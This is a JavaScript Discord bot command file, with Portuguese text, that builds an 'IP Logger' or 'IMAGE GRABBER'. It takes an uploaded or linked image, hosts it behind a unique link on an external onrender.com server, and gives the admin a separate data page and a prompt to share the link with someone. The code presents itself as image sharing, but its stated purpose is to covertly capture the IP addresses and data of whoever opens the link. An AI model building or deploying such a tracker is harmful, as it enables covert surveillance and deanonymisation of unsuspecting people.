const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const fs = require('fs');
const path = require('path');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('img')
    .setDescription('📸 Gera um link direto para uma imagem com IP Logger')
    .addStringOption(option =>
      option.setName('link')
        .setDescription('Link da imagem (opcional)')
        .setRequired(false)
    )
    .addAttachmentOption(option =>
      option.setName('imagem')
        .setDescription('Faça upload da imagem')
        .setRequired(false)
    ),

  async execute(interaction, client) {
    if (!interaction.memberPermissions.has('Administrator')) {
      return interaction.reply({ content: '❌ Apenas ADMs.', flags: 64 });
    }

    await interaction.deferReply({ flags: 64 });

    const id = Math.random().toString(36).substring(2, 10);
    const link = `https://cbsteam.onrender.com/img/${id}`;
    const dadosLink = `https://cbsteam.onrender.com/dados/${id}`;

    let imagemLink = interaction.options.getString('link');
    const attachment = interaction.options.getAttachment('imagem');

    const publicDir = path.join(__dirname, '..', 'public');
    if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir, { recursive: true });

    let imagemSalva = false;

    if (attachment) {
      try {
        const response = await fetch(attachment.url);
        const buffer = await response.buffer();
        const ext = attachment.name.split('.').pop() || 'jpg';
        const filePath = path.join(publicDir, `${id}.${ext}`);
        fs.writeFileSync(filePath, buffer);
        global.imageStore = global.imageStore || {};
        global.imageStore[id] = filePath;
        imagemSalva = true;
      } catch (e) {
        console.error('Erro ao salvar imagem:', e);
      }
    } else if (imagemLink) {
      try {
        const response = await fetch(imagemLink);
        const buffer = await response.buffer();
        const ext = imagemLink.split('.').pop()?.split('?')[0] || 'jpg';
        const filePath = path.join(publicDir, `${id}.${ext}`);
        fs.writeFileSync(filePath, buffer);
        global.imageStore = global.imageStore || {};
        global.imageStore[id] = filePath;
        imagemSalva = true;
      } catch (e) {
        console.error('Erro ao baixar imagem:', e);
      }
    }

    if (!imagemSalva) {
      const padrao = path.join(publicDir, 'imagem.jpg');
      if (fs.existsSync(padrao)) {
        global.imageStore = global.imageStore || {};
        global.imageStore[id] = padrao;
      } else {
        global.imageStore = global.imageStore || {};
        global.imageStore[id] = null;
      }
    }

    const embed = new EmbedBuilder()
      .setTitle('📸 IMAGE GRABBER GERADO!')
      .setDescription(`**Link para compartilhar:**\n\`${link}\``)
      .setColor(0xFF0000)
      .addFields(
        { name: '📊 Ver dados', value: `${dadosLink}`, inline: true },
        { name: '🆔 ID', value: `\`${id}\``, inline: true },
        { name: '📝 Dica', value: 'Cole o link no navegador ou compartilhe com alguém!' }
      )
      .setFooter({ text: 'CBS TEAM - Image Grabber' })
      .setTimestamp();

    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setLabel('🔗 Copiar Link')
          .setStyle(ButtonStyle.Primary)
          .setCustomId(`copy_${id}`)
      );

    await interaction.editReply({
      embeds: [embed],
      components: [row]
    });
  }
};